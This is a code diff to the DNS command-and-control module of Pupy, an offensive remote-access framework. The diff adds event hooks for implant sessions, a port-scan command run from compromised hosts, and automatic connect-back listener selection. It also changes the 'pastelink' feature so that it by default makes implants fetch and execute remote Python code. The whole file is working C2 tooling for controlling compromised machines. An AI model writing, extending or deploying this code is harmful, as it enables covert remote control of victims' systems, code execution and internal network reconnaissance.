@@ -6,27 +6,54 @@ from network.lib.picocmd.picocmd import *
 from Queue import Queue
 
 from pupylib.PupyConfig import PupyConfig
-from pupylib.utils.network import get_listener_ip, get_listener_port
+from pupylib.utils.network import get_listener_ip_with_local, get_listener_port
+
+from pupylib.PupyOffload import PupyOffloadManager
 
 import requests
 import netifaces
+import netaddr
 import socket
 
 from urlparse import urlparse
 
 from os import path
 
+from .PupyTriggers import event
+from .PupyTriggers import ON_DNSCNC_SESSION, ON_DNSCNC_SESSION_LOST
+
 from network.lib.igd import IGDClient, UPNPError
 
 class PupyDnsCommandServerHandler(DnsCommandServerHandler):
     def __init__(self, *args, **kwargs):
         if 'config' in kwargs:
-            self.config = kwargs.get('config')
-            del kwargs['config']
+            self.config = kwargs.pop('config')
         else:
             self.config = None
 
+        if 'server' in kwargs:
+            self.server = kwargs.pop('server')
+        else:
+            self.server = None
+
         DnsCommandServerHandler.__init__(self, *args, **kwargs)
+
+    def on_new_session(self, session):
+        if self.server.cmdhandler:
+            event(ON_DNSCNC_SESSION, session, self.server, self.server.cmdhandler, self.config)
+
+    def on_session_cleaned_up(self, session):
+        if self.server.cmdhandler:
+            event(ON_DNSCNC_SESSION_LOST, session,
+                  self.server, self.server.cmdhandler, self.config)
+
+    def onlinestatus(self, node=None, default=False):
+        return self.add_command(
+            OnlineStatusRequest(), session=node, default=default)
+
+    def scan(self, host, first, last, node=None, default=False):
+        return self.add_command(
+            CheckConnect(host, first, last), session=node, default=default)
 
     def connect(self, hosts, port, transport, node=None, default=False):
         commands = [
@@ -98,11 +125,15 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
                     nodes = []
                     for n in node.split(','):
                         try:
-                            int(n, 16)
+                            netaddr.IPAddress(n)
                             nodes.append(n)
                         except:
-                            for tagged in self.config.by_tags(n):
-                                nodes.append(tagged)
+                            try:
+                                int(n, 16)
+                                nodes.append(n)
+                            except:
+                                for tagged in self.config.by_tags(n):
+                                    nodes.append(tagged)
 
                     if nodes:
                         results = DnsCommandServerHandler.find_sessions(
@@ -133,10 +164,13 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
 
 class PupyDnsCnc(object):
     def __init__(
-            self, igd=None, connect_host=None,
+            self, igd=None,
             recursor=None,
-            connect_transport='ssl', connect_port=443,
-            config=None, credentials=None
+            config=None,
+            credentials=None,
+            listeners=None,
+            cmdhandler=None,
+            pproxy=None
         ):
 
         credentials = credentials or Credentials()
@@ -145,6 +179,9 @@ class PupyDnsCnc(object):
         self.config = config
         self.credentials = credentials
         self.igd = igd
+        self.listeners = listeners
+        self.cmdhandler = cmdhandler
+        self.pproxy = pproxy
 
         fdqn = self.config.get('pupyd', 'dnscnc').split(':')
         domain = fdqn[0]
@@ -155,16 +192,6 @@ class PupyDnsCnc(object):
 
         listen = str(config.get('pupyd', 'address') or '0.0.0.0')
         prefer_external = config.getboolean('gen', 'external')
-
-        self.host = [
-            str(get_listener_ip(
-                external=prefer_external,
-                config=config,
-                igd=igd
-            ))
-        ]
-        self.port = get_listener_port(config, external=prefer_external)
-        self.transport = config.get('pupyd', 'transport')
 
         recursor = config.get('pupyd', 'recursor')
         if recursor and recursor.lower() in ('no', 'false', 'stop', 'n', 'disable'):
@@ -178,18 +205,25 @@ class PupyDnsCnc(object):
             domain,
             credentials['DNSCNC_PRIV_KEY'],
             recursor=recursor,
-            config=self.config
+            config=self.config,
+            server=self
         )
 
-        self.server = DnsCommandServer(
-            self.handler,
-            address=listen,
-            port=int(port)
-        )
+        if self.pproxy:
+            try:
+                self.server = self.pproxy.dns(self.handler, domain)
+            except Exception, e:
+                logging.exception(e)
+        else:
+            self.server = DnsCommandServer(
+                self.handler,
+                address=listen,
+                port=int(port)
+            )
 
-        if self.igd and self.igd.available:
-            self.igd.AddPortMapping(53, 'UDP', int(port))
-            self.igd.AddPortMapping(53, 'TCP', int(port))
+            if self.igd and self.igd.available:
+                self.igd.AddPortMapping(53, 'UDP', int(port))
+                self.igd.AddPortMapping(53, 'TCP', int(port))
 
         self.server.start()
 
@@ -201,13 +235,72 @@ class PupyDnsCnc(object):
           or self.handler.find_sessions(spi=node)
 
     def connect(self, host=None, port=None, transport=None, node=None, default=False):
+        if port:
+            port = int(port)
+
+        if not all([host, port, transport]):
+            listeners = self.listeners()
+            if not listeners:
+                raise ValueError(
+                    'No active listeners. Host, port and transport shoul be explicitly specified')
+
+            listener = None
+            local = False
+
+            if transport:
+                listener = listeners.get(transport)
+                if not listener:
+                    raise ValueError('Listener for transport {} not found'.format(transport))
+
+            else:
+                for l in listeners.itervalues():
+                    if not l.local or ( port and ( l.port == port or l.external_port == port ) ):
+                        listener = l
+                        break
+
+                if not listener:
+                    listener = next(listeners.itervalues())
+                    if listener.port == 0:
+                        local = False
+                    else:
+                        local = True
+
+            if not listener:
+                raise ValueError('No listeners found')
+
+            if local:
+                _port = get_listener_port(self.config, external=True)
+                _host, local = get_listener_ip_with_local(
+                    config=self.config, external=True, igd=self.igd)
+
+                if local:
+                    raise ValueError(
+                        'External host:port not found. '
+                        'Please explicitly specify either port or host, port and transport.')
+
+                host = host or _host
+                port = port or _port
+                transport = listener.name
+            else:
+                host = host or listener.external
+                port = port or listener.external_port
+                transport = listener.name
+
+            if self.cmdhandler:
+                self.cmdhandler.display_success('Connect: Transport: {} Host: {} Port: {}'.format(
+                    transport, host, port))
+
         return self.handler.connect(
-            self.host if host is None else [ host ],
-            self.port if port is None else port,
-            self.transport if transport is None else transport,
+            [ host ], port, transport,
             node=node,
             default=default
         )
+
+    def scan(self, *args, **kwargs):
+        return self.handler.scan(*args, **kwargs)
+
+    def onlinestatus(self, **kwargs):
+        return self.handler.onlinestatus(**kwargs)
 
     def disconnect(self, **kwargs):
         return self.handler.disconnect(**kwargs)
@@ -230,7 +323,7 @@ class PupyDnsCnc(object):
     def proxy(self, *args, **kwargs):
         return self.handler.proxy(*args, **kwargs)
 
-    def pastelink(self, content=None, url=None, action='pyeval', node=None, default=False):
+    def pastelink(self, content=None, url=None, action='pyexec', node=None, default=False):
         if not ( content or url ):
             raise ValueError('content and url args are empty')
 
@@ -256,6 +349,10 @@ class PupyDnsCnc(object):
             raise ValueError('couldn\'t create pastelink url')
 
         count = self.handler.pastelink(url, action, node=node, default=default)
+        if count and self.cmdhandler:
+            self.cmdhandler.display_success('Pastelink: Url: {} Action: {}'.format(
+                url, action))
+
         return count, url
 
     @property
@@ -284,3 +381,7 @@ class PupyDnsCnc(object):
     @property
     def commands(self):
         return self.handler.commands
+
+    @property
+    def node_commands(self):
+        return self.handler.node_commands
